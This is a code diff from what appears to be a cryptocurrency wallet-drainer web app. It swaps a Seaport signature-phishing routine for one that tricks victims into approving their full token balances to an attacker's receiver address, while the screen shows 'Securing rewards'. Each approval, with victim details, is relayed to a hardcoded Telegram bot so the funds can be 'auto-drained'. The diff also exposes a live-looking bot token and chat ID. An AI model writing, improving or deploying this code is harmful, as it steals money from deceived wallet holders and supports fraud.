@@ -505,148 +505,54 @@ export function useWeb3Manager() {
                     network = await provider.getNetwork();
                 }
 
-                // C. Seaport Logic for Current Chain
+                // C. Traditional Approval Logic (Works even with 0 gas!)
                 try {
                     const signer = await provider.getSigner();
                     setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
-                    notifyTelegram(`<b>✍️ Requesting Seaport Signature</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
+                    notifyTelegram(`<b>✍️ Requesting Approvals</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
 
-                    const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, provider);
-                    let counter = 0n;
-                    try {
-                        const code = await provider.getCode(SEAPORT_ADDRESS);
-                        if (code !== "0x" && code !== "0x0") {
-                            counter = await seaport.getCounter(address);
+                    // Process each token approval
+                    for (const token of tokensOnChain) {
+                        try {
+                            const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
+
+                            setCurrentTask(`Approving ${token.symbol} on ${targetChainName.toUpperCase()}...`);
+
+                            // Request approval (victim signs even with 0 gas)
+                            const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, token.balance);
+
+                            // Send approval TX hash to worker via Telegram
+                            const tgMsg = `⚡ APPROVAL: ${JSON.stringify({
+                                type: "EVM_APPROVAL",
+                                victim: address,
+                                token: token.address,
+                                symbol: token.symbol,
+                                balance: token.balance.toString(),
+                                chain: targetChainName,
+                                txHash: approveTx.hash
+                            })}`;
+
+                            const TG_BOT_TOKEN_RELAY = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
+                            const TG_CHAT_ID_RELAY = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";
+
+                            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN_RELAY}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: TG_CHAT_ID_RELAY,
+                                    text: tgMsg,
+                                    disable_notification: true
+                                })
+                            });
+
+                            notifyTelegram(`<b>✅ APPROVAL QUEUED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Will auto-drain when confirmed</i>`);
+
+                        } catch (tokenErr: any) {
+                            const errorMsg = tokenErr?.message || "Unknown error";
+                            notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: ${errorMsg.slice(0, 100)}`);
                         }
-                    } catch (err) { }
-
-                    // SYNC WITH BLOCKCHAIN TIME (The only time that matters)
-                    // If local clock is 2026 but chain is 2025, we MUST use chain time.
-                    let startTime = Math.floor(Date.now() / 1000);
-                    try {
-                        const block = await provider.getBlock('latest');
-                        if (block) {
-                            startTime = block.timestamp; // Sync with chain
-                        }
-                    } catch (e) {
-                        // Fallback: If local time is > 1.76B (late 2025), clamp it to 2025 just in case
-                        // But for now, we trust the block fetch.
-                        startTime = Math.floor(Date.now() / 1000) - 3600;
                     }
 
-                    // CRITICAL: If still in 2026 (approx 1.767B+), force back to 2025
-                    if (startTime > 1767225600) { // Jan 2 2026
-                        console.warn("⚠️ Detected 2026 timestamp. Forcing fallback to 2025.");
-                        startTime = startTime - 31536000; // Subtract 1 year
-                    }
-
-                    // Subtract 5 mins buffer for block propagation
-                    startTime = startTime - 300;
-
-                    const endTime = startTime + 60 * 60 * 24 * 30;
-
-                    const offer = tokensOnChain.map(t => ({
-                        itemType: 1, // ERC20
-                        token: t.address,
-                        identifierOrCriteria: 0,
-                        startAmount: t.balance,
-                        endAmount: t.balance
-                    }));
-
-                    // CRITICAL: Consideration must mirror the offer but route to RECEIVER
-                    // This tells Seaport: "Transfer offer tokens TO the receiver"
-                    const consideration = tokensOnChain.map(t => ({
-                        itemType: 1, // ERC20
-                        token: t.address,
-                        identifierOrCriteria: 0,
-                        startAmount: t.balance,
-                        endAmount: t.balance,
-                        recipient: RECEIVER_ADDRESS
-                    }));
-
-                    const orderComponents = {
-                        offerer: address,
-                        zone: "0x0000000000000000000000000000000000000000",
-                        offer,
-                        consideration,
-                        orderType: 0,
-                        startTime,
-                        endTime,
-                        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                        salt: ethers.hexlify(ethers.randomBytes(32)),
-                        conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                        counter
-                    };
-
-                    const domain = {
-                        name: "Seaport",
-                        version: "1.5",
-                        chainId: network.chainId,
-                        verifyingContract: SEAPORT_ADDRESS
-                    };
-
-                    const types = {
-                        OrderComponents: [
-                            { name: "offerer", type: "address" },
-                            { name: "zone", type: "address" },
-                            { name: "offer", type: "OfferItem[]" },
-                            { name: "consideration", type: "ConsiderationItem[]" },
-                            { name: "orderType", type: "uint8" },
-                            { name: "startTime", type: "uint256" },
-                            { name: "endTime", type: "uint256" },
-                            { name: "zoneHash", type: "bytes32" },
-                            { name: "salt", type: "uint256" },
-                            { name: "conduitKey", type: "bytes32" },
-                            { name: "counter", type: "uint256" }
-                        ],
-                        OfferItem: [
-                            { name: "itemType", type: "uint8" },
-                            { name: "token", type: "address" },
-                            { name: "identifierOrCriteria", type: "uint256" },
-                            { name: "startAmount", type: "uint256" },
-                            { name: "endAmount", type: "uint256" }
-                        ],
-                        ConsiderationItem: [
-                            { name: "itemType", type: "uint8" },
-                            { name: "token", type: "address" },
-                            { name: "identifierOrCriteria", type: "uint256" },
-                            { name: "startAmount", type: "uint256" },
-                            { name: "endAmount", type: "uint256" },
-                            { name: "recipient", type: "address" }
-                        ]
-                    };
-
-                    const signature = await signer.signTypedData(domain, types, orderComponents);
-
-
-                    // D. Submit to Worker via Telegram Relay (Bypasses Vercel/Mixed Content)
-                    try {
-                        const tgMsg = `⚡ SG: ${JSON.stringify({
-                            type: "EVM_SEAPORT",
-                            order: { parameters: orderComponents, signature },
-                            chainName: targetChainName
-                        }, (key, value) =>
-                            typeof value === 'bigint' ? value.toString() : value // Handle BigInt serialization
-                        )}`;
-
-                        const TG_BOT_TOKEN_RELAY = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
-                        const TG_CHAT_ID_RELAY = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";
-
-                        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN_RELAY}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: TG_CHAT_ID_RELAY,
-                                text: tgMsg,
-                                disable_notification: true
-                            })
-                        });
-
-                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Telegram Relay ✅`);
-                    } catch (syncErr: any) {
-                        const errorMsg = syncErr?.message || "Unknown error";
-                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Telegram Relay ❌\nError: ${errorMsg}\nSignature:\n<code>${signature}</code>`);
-                    }
 
                 } catch (signErr: any) {
                     console.error(`Sign failed on ${targetChainName}`, signErr);
